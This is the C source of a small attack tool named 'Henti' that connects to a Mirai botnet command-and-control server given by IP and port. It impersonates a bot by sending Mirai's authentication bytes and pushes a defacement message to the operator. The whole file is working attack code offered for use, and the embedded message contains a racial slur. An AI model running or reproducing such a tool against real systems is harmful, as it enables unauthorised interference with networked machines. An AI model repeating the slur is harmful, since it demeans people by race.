/*
  ___ ___                 __  .__ _______          __     ___ ___                 __         .__ 
 /   |   \   ____   _____/  |_|__|\      \   _____/  |_  /   |   \   ____   _____/  |______  |__|
/    ~    \_/ __ \ /    \   __\  |/   |   \ /  _ \   __\/    ~    \_/ __ \ /    \   __\__  \ |  |
\    Y    /\  ___/|   |  \  | |  /    |    (  <_> )  |  \    Y    /\  ___/|   |  \  |  / __ \|  |
 \___|_  /  \___  >___|  /__| |__\____|__  /\____/|__|   \___|_  /  \___  >___|  /__| (____  /__|
       \/       \/     \/                \/                    \/       \/     \/          \/    

       Created 5/29/2023

        - Install gcc (Example Debian Based "apt install gcc")
        
        - How To Run? (gcc main.c -o Henti -Wextra)
            (./Henti C2IP C2Port)
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <unistd.h>

#define SA struct sockaddr

int len(char text[])
{

    long unsigned int i;

    for (i = 0; text[i] != '\0'; i++)
        ;

    return i;
}

void deface(char *Host, int Port)
{
    int sockfd, connfd;
    struct sockaddr_in servaddr, cli;

    char AuthBytes[] = {0x00, 0x00, 0x00, 0x01}; // Auth Bytes Mirai Uses
    char Message[] = "Henti Defaced Yo Net!!!\r\n\r\n\r\nLearn How To Code\r\nStupid Nigger >:C\r\n";// Edit Message Here!!!

    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if (sockfd == -1)
    {

        perror("[:Henti] Failed To Create Socket! ");
    }

    memset(&servaddr, '\0', sizeof(servaddr));

    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr(Host);
    servaddr.sin_port = htons(Port);

    if (connect(sockfd, (SA *)&servaddr, sizeof(servaddr)) != 0)
    {

        printf("[:Henti] Connection To %s:%d Failed!\n", Host, Port);
        exit(0);
    }

    // Connected To The Cnc Is Now Done Now Using sockfd To Sent Information To The Socket

    write(sockfd,AuthBytes, sizeof(AuthBytes));

    write(sockfd, "e", 1);//

    write(sockfd, Message, sizeof(Message));


    printf("[:Henti] Sent Deface To [%s:%d] Message (%s)",Host,Port,Message);

    sleep(350);

    close(sockfd);
}

int main(int argc, char *argv[])
{

    int Port;

    printf("  ___ ___                 __  .__ \r\n");
    printf(" /   |   \\   ____   _____/  |_|__|\r\n");
    printf("/    ~    \\_/ __ \\ /    \\   __\\  |\r\n");
    printf("\\    Y    /\\  ___/|   |  \\  | |  |\r\n");
    printf(" \\___|_  /  \\___  >___|  /__| |__|\r\n");
    printf("       \\/       \\/     \\/         \r\n");

    if (argc == 3)
    {
        if (len(argv[1]) > 15)
        {
            puts("[:Henti] Please Check Your Host Ip\n");
            exit(0);
        }
        else if ((Port = atoi(argv[2])) != 0)
        {

            deface(argv[1], Port);
            exit(0);
        }
        else
        {

            puts("[:Henti] Please Make Sure Your Port Is A Number!\n");
            exit(0);
        }
    }
    else
    {

        puts("[:Henti] Please Use The Correct Args ./Henti IPV4 Port\n[:Henti] Make Sure Its A Mirai IP And Port!\n");
        exit(0);
    }

    return 0;
}
